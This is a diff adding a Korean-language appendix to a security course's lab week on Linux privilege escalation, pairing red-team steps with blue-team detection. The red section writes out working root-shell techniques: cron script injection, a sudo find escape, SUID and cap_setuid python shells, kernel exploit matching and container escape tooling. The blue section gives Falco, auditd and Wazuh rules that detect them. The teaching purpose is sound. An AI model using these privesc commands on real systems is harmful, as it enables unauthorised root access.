@@ -737,3 +737,240 @@ graph LR
 
 **학생 액션**: lab CVE-2021-3156 시도 → audit 흔적 추적.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 05 Privilege Escalation + Blue Detection)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | Linux enum | **LinPEAS** |
+| s2 | Win enum | WinPEAS / Seatbelt |
+| s3 | Cron 실시간 | **pspy64** |
+| s4 | Sudo + GTFOBins | gtfobins-cli |
+| s5 | 커널 익스플로잇 매칭 | linux-exploit-suggester |
+| s6 | Falco 탐지 (Blue) | Falco rules |
+| s7 | auditd 사용자 행위 | auditd + ausearch |
+| s8 | Wazuh user-behavior | Wazuh module |
+
+### 학생 환경 준비
+
+```bash
+# Red 도구 (attacker VM)
+mkdir -p ~/peass && cd ~/peass
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+
+# pspy64
+mkdir -p ~/.local/bin
+curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o ~/.local/bin/pspy64
+chmod +x ~/.local/bin/pspy64
+
+# linux-exploit-suggester
+git clone https://github.com/mzet-/linux-exploit-suggester ~/les
+ln -sf ~/les/linux-exploit-suggester.sh ~/.local/bin/les
+
+# GTFOBlookup
+pip install gtfobins-cli
+
+# Blue 도구 (모든 VM)
+sudo apt install -y auditd audispd-plugins falco
+sudo systemctl enable --now auditd
+
+# Falco rule update
+sudo falcoctl artifact install falco-rules
+```
+
+### Red — Linux privesc 8 단계
+
+```bash
+# === Phase 1: 자동 enum (LinPEAS) ===
+~/peass/linpeas.sh -a -j > /tmp/linpeas.json
+~/peass/linpeas.sh -a -d 10.20.30.80                  # 도메인 정보 추가
+
+# 결과 분석 — interesting findings 만
+grep -E '\[!\]|\[+\]' /tmp/linpeas-output.txt | head -50
+
+# === Phase 2: Cron 실시간 모니터 ===
+pspy64 -p -f &                                         # background
+
+# 출력 예 (cron 발견):
+# 2026-05-02 10:00:01 CMD: UID=0    PID=12345 /usr/bin/python3 /opt/secret.py
+# → 5분마다 root 가 실행하는 python script 발견!
+
+# Script 권한 확인
+ls -la /opt/secret.py                                  # world-writable?
+cat /opt/secret.py
+
+# 만약 -wxr-xr-x:
+echo 'os.system("chmod +s /bin/bash")' >> /opt/secret.py
+# 5분 대기 → /bin/bash 가 SUID (root)
+/bin/bash -p                                           # root shell
+
+# === Phase 3: Sudo + GTFOBins ===
+sudo -l
+# (root) NOPASSWD: /usr/bin/find
+
+# GTFOBins 매칭
+gtfobins find sudo
+# 출력: sudo find . -exec /bin/sh \; -quit
+# → root shell
+
+sudo find . -exec /bin/sh \; -quit
+# # whoami → root!
+
+# === Phase 4: SUID binary 점검 ===
+find / -perm -4000 -type f 2>/dev/null
+
+# 비정상 SUID 발견 → GTFOBins 매칭
+# 예: /usr/bin/python3 가 SUID 면
+gtfobins python3 suid
+# 출력: ./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# === Phase 5: Capabilities ===
+getcap -r / 2>/dev/null
+# 발견: /usr/bin/python3.10 = cap_setuid+ep
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# === Phase 6: Writable PATH/file ===
+find / -writable -type f 2>/dev/null | head -20
+# /etc/cron.d/* 가 writable 면 → 자체 cron 추가
+
+# === Phase 7: 커널 exploit ===
+~/les/linux-exploit-suggester.sh --uname --gcc
+
+# 출력 예:
+# [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+# [+] Exposure: highly probable
+# [+] Tags: ubuntu=22.04, kernel=5.15
+# [+] Download URL: https://www.exploit-db.com/exploits/50979
+
+# === Phase 8: Container escape (있으면) ===
+[ -f /.dockerenv ] && echo "In container" 
+mount | grep -E "docker|cgroup"
+
+# CDK toolkit
+git clone https://github.com/cdk-team/CDK ~/cdk
+~/cdk/bin/cdk evaluate
+```
+
+### Blue — privesc 탐지 (Falco)
+
+```bash
+# === Falco 룰 (privesc 자동 탐지) ===
+sudo tee /etc/falco/falco_rules.local.yaml << 'EOF'
+- rule: Privilege Escalation via Sudo
+  desc: Detect sudo to root with shell
+  condition: >
+    spawned_process and 
+    proc.name = sudo and 
+    (proc.cmdline contains "/bin/sh" or 
+     proc.cmdline contains "/bin/bash" or
+     proc.cmdline contains "find" or 
+     proc.cmdline contains "vim")
+  output: "Privesc via sudo (user=%user.name cmd=%proc.cmdline)"
+  priority: WARNING
+
+- rule: SUID Binary Execution
+  desc: Suspicious SUID binary
+  condition: >
+    spawned_process and 
+    proc.is_suid_root = true and
+    proc.name in (find, vim, less, more, awk, perl, python3)
+  output: "SUID privesc attempt (user=%user.name binary=%proc.name)"
+  priority: CRITICAL
+
+- rule: Capabilities-based Privesc
+  desc: cap_setuid 또는 cap_sys_admin
+  condition: >
+    spawned_process and 
+    proc.name in (python3, perl, ruby) and
+    (proc.cmdline contains "setuid(0)" or 
+     proc.cmdline contains "execl")
+  output: "Capability privesc (user=%user.name cmd=%proc.cmdline)"
+  priority: CRITICAL
+
+- rule: Writable Cron 자체 추가
+  desc: Cron 파일 변경
+  condition: >
+    open_write and 
+    (fd.name startswith "/etc/cron.d" or
+     fd.name startswith "/var/spool/cron/crontabs")
+  output: "Cron file modified (user=%user.name file=%fd.name)"
+  priority: ERROR
+EOF
+
+sudo systemctl restart falco
+
+# === auditd 룰 ===
+sudo tee /etc/audit/rules.d/privesc.rules << 'EOF'
+# 권한 변경
+-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k privesc
+
+# Sudo 실행
+-w /etc/sudoers -p wa -k actions
+-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k sudo_exec
+
+# SUID/SGID 변경
+-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k perm_change
+EOF
+
+sudo augenrules --load
+sudo systemctl restart auditd
+
+# 검색
+sudo ausearch -k privesc -i | head
+sudo ausearch -k sudo_exec --start today | head
+
+# === Wazuh user-behavior + ATT&CK 매핑 ===
+sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'EOF'
+<rule id="100500" level="13">
+  <if_matched_sid>5710</if_matched_sid>
+  <match>sudo .* /bin/sh</match>
+  <description>Privesc via sudo to shell</description>
+  <mitre><id>T1548.003</id></mitre>
+</rule>
+EOF
+```
+
+### 자동 대응 (Falco → Wazuh AR → 격리)
+
+```bash
+# Falco webhook → Wazuh
+# /etc/falco/falco.yaml
+# program_output:
+#   enabled: true
+#   program: "curl -X POST http://wazuh:9200/_doc -d @-"
+
+# Wazuh AR — privesc 탐지 시 사용자 차단
+sudo tee /var/ossec/active-response/bin/lock-user.sh << 'EOF'
+#!/bin/bash
+USER=$5
+sudo passwd -l $USER                                  # 잠금
+sudo pkill -KILL -u $USER                             # 모든 process 종료
+EOF
+sudo chmod +x /var/ossec/active-response/bin/lock-user.sh
+
+# /var/ossec/etc/ossec.conf
+# <command><name>lock-user</name><executable>lock-user.sh</executable></command>
+# <active-response><command>lock-user</command><location>local</location><level>13</level></active-response>
+```
+
+### Privesc 결과 (Red vs Blue 점수)
+
+| Red 성공 | 점수 | Blue 탐지 | 점수 |
+|---------|------|----------|------|
+| LinPEAS 자동 발견 | +5 | Falco 알림 | +10 |
+| Cron 침투 (pspy) | +15 | auditd 변경 감지 | +10 |
+| Sudo + GTFOBins | +10 | Wazuh ATT&CK | +10 |
+| SUID exploit | +15 | Falco SUID rule | +10 |
+| Capability 악용 | +10 | Falco capability | +5 |
+| 커널 exploit | +20 | (탐지 어려움) | - |
+| Container escape | +25 | Falco container | +15 |
+| 흔적 은닉 | +10 | aide FIM | +10 |
+
+학생은 본 5주차에서 **Red (LinPEAS + pspy + GTFOBins + linux-exploit-suggester) ↔ Blue (Falco + auditd + Wazuh user-behavior)** 의 privesc 공방을 OSS 도구로 익힌다.
